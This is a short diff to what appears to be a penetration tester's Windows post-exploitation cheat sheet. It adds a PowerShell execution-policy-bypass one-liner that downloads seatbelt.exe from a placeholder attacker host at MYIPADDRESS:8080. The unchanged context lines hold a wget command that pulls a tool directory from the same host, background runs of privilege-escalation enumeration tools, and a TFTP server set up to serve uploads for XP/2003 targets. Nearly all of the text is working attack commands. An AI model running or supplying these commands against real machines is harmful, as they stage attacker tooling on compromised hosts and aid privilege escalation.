@@ -438,6 +438,9 @@ wget.exe http://MYIPADDRESS:8080/ -r && move MYIPADDRESS+8080 exploits && cd exp
 
 START /B windows-privesc-check2.exe --audit -a -o wpc-report && START /B accesschk.exe -uwcqv "Authenticated Users" * /accepteula && START /B seatbelt.exe all > seatbelt-report
 
+OR with Powershell
+powershell -exec bypass -c (New-Object System.Net.WebClient).DownloadFile('http://MYIPADDRESS:8080/seatbelt.exe','seatbelt.exe')
+
 Windows XP and Server 2003:
 Host:
 atftpd --daemon --port 69 /root/Dropbox/Scripts/Post_Windows/uploads
